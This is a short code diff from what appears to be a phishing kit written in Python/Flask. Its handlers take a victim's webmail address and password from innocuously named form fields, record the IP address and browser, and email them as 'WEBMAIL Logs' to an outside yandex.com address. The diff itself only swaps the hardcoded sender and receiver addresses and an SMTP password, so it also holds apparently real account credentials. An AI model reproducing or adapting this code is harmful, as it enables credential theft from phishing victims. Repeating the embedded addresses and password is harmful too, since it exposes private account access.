@@ -145,10 +145,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "eissa@waterworldwaterpark.com"
+        sender_email = "eissa@aterwworldwaterpark.com"
         sender_emaill = "eissa"
-        receiver_email = "ifediosakwe@yandex.com"
-        password = "@#b525az2ojiugo"
+        receiver_email = "ifediose@yandex.com"
+        password = "@#b525az2"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL Logs !"
@@ -185,8 +185,8 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "eissa@waterworldwaterpark.com"
         sender_emaill = "eissa"
-        receiver_email = "ifediosakwe@yandex.com"
-        password = "@#b525az2ojiugo"
+        receiver_email = "ifediose@yandex.com"
+        password = "@#b525az2"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL logs !! "
